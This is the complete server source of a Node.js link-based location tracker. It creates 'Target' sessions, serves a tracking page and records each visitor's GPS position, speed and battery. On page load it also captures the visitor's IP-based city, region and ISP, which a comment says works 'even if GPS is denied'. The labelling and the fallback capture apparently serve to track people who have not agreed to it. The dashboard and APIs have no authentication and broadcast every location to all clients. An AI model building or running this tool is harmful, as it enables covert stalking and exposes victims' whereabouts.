const express = require('express');
const http = require('http');
const { Server } = require('socket.io');
const cors = require('cors');
const path = require('path');
const fs = require('fs');
const crypto = require('crypto');

const app = express();
const server = http.createServer(app);
const io = new Server(server, {
  cors: { origin: '*' }
});

const PORT = process.env.PORT || 3000;
const DB_FILE = path.join(__dirname, 'data.json');

let database = { sessions: {}, locations: {} };
if (fs.existsSync(DB_FILE)) {
  try {
    database = JSON.parse(fs.readFileSync(DB_FILE, 'utf-8'));
  } catch (e) {
    console.error('Error loading DB, initializing fresh:', e);
  }
}

function saveDB() {
  fs.writeFileSync(DB_FILE, JSON.stringify(database, null, 2));
}

// Auto IP Geo-Location Resolver (Captures city/state even if GPS is denied)
async function resolveAndRecordIp(sessionId, clientIp) {
  if (!clientIp || clientIp === '127.0.0.1' || clientIp === '::1' || clientIp.startsWith('192.168.') || clientIp.startsWith('10.')) return;
  
  const existing = database.locations[sessionId] || [];
  if (existing.length > 0 && existing.some(p => p.accuracy && p.accuracy < 500)) {
    return; // Already have high-precision GPS, skip coarse IP
  }

  try {
    const cleanIp = clientIp.replace(/^::ffff:/, '');
    const res = await fetch(`https://ipwho.is/${cleanIp}`);
    const data = await res.json();
    if (data && data.success && data.latitude && data.longitude) {
      const now = Date.now();
      const payload = {
        sessionId,
        latitude: parseFloat(data.latitude),
        longitude: parseFloat(data.longitude),
        accuracy: 2500, // Coarse IP approximate radius
        speed: 0,
        heading: 0,
        battery: 100,
        city: data.city || '',
        region: data.region || '',
        isp: (data.connection && data.connection.isp) || '',
        isIpEstimate: true,
        timestamp: now
      };

      if (!database.sessions[sessionId]) {
        database.sessions[sessionId] = {
          sessionId,
          label: `${data.city || 'Target'} (IP)`,
          createdAt: now
        };
        database.locations[sessionId] = [];
      }

      database.locations[sessionId].push(payload);
      saveDB();

      io.to(sessionId).emit('location_update', payload);
      io.emit('location_update', payload);
      console.log(`[Auto IP Geo] Session: ${sessionId} -> ${data.city}, ${data.region} (${data.latitude}, ${data.longitude})`);
    }
  } catch (err) {
    console.error('IP geo lookup failed:', err.message);
  }
}

app.use(cors());
app.use(express.json());
app.use(express.static(path.join(__dirname, 'public')));

// Create tracking session
app.post('/api/sessions', (req, res) => {
  const sessionId = crypto.randomBytes(4).toString('hex');
  const label = (req.body && req.body.label) ? req.body.label.trim() : 'Target Device';
  const now = Date.now();

  database.sessions[sessionId] = {
    sessionId,
    label,
    createdAt: now
  };
  database.locations[sessionId] = [];
  saveDB();

  res.json(database.sessions[sessionId]);
});

// List all sessions
app.get('/api/sessions', (req, res) => {
  const list = Object.values(database.sessions).map(s => {
    const locs = database.locations[s.sessionId] || [];
    const lastLoc = locs.length > 0 ? locs[locs.length - 1] : null;
    return {
      sessionId: s.sessionId,
      label: s.label,
      createdAt: s.createdAt,
      pointCount: locs.length,
      lastSeen: lastLoc ? lastLoc.timestamp : null
    };
  }).sort((a, b) => b.createdAt - a.createdAt);

  res.json(list);
});

// Get session details and location history
app.get('/api/sessions/:id', (req, res) => {
  const session = database.sessions[req.params.id];
  if (!session) {
    return res.status(404).json({ error: 'Session not found' });
  }
  const points = database.locations[req.params.id] || [];
  res.json({
    ...session,
    points
  });
});

// Delete session
app.delete('/api/sessions/:id', (req, res) => {
  delete database.sessions[req.params.id];
  delete database.locations[req.params.id];
  saveDB();
  res.json({ status: 'deleted' });
});

// Receive location ping from target
app.post('/api/location/:id', (req, res) => {
  const sessionId = req.params.id;
  const now = Date.now();

  if (!database.sessions[sessionId]) {
    database.sessions[sessionId] = {
      sessionId,
      label: 'Direct Client',
      createdAt: now
    };
    database.locations[sessionId] = [];
  }

  const payload = {
    sessionId,
    latitude: parseFloat(req.body.latitude),
    longitude: parseFloat(req.body.longitude),
    accuracy: parseFloat(req.body.accuracy) || 0,
    speed: parseFloat(req.body.speed) || 0,
    heading: parseFloat(req.body.heading) || 0,
    battery: parseFloat(req.body.battery) || 0,
    timestamp: now
  };

  database.locations[sessionId].push(payload);
  saveDB();

  // Real-time broadcast (both room and global for zero-drop redundancy)
  io.to(sessionId).emit('location_update', payload);
  io.emit('location_update', payload);
  console.log(`[Location Ingest] Session: ${sessionId} -> Lat: ${payload.latitude}, Lng: ${payload.longitude}`);

  res.json({ status: 'ok', timestamp: now });
});

// Socket.io room management
io.on('connection', (socket) => {
  socket.on('join_session', (sessionId) => {
    socket.join(sessionId);
  });
});

// Fallback endpoint for client-triggered IP lookup
app.post('/api/ip-fallback/:id', (req, res) => {
  const sessionId = req.params.id;
  const forwarded = req.headers['x-forwarded-for'] || req.headers['cf-connecting-ip'];
  const clientIp = forwarded ? forwarded.split(',')[0].trim() : req.socket.remoteAddress;
  resolveAndRecordIp(sessionId, clientIp);
  res.json({ status: 'resolving_ip' });
});

// Target mobile page
app.get('/track/:id', (req, res) => {
  const sessionId = req.params.id;
  const forwarded = req.headers['x-forwarded-for'] || req.headers['cf-connecting-ip'];
  const clientIp = forwarded ? forwarded.split(',')[0].trim() : req.socket.remoteAddress;
  resolveAndRecordIp(sessionId, clientIp);

  const trackPath = path.join(__dirname, 'public', 'track.html');
  let html = fs.readFileSync(trackPath, 'utf-8');
  html = html.replace(/{{SESSION_ID}}/g, sessionId);
  res.send(html);
});

// Admin dashboard route
app.get(['/', '/admin'], (req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

server.listen(PORT, '0.0.0.0', () => {
  console.log(`Node.js Location Tracker running on http://0.0.0.0:${PORT}`);
});

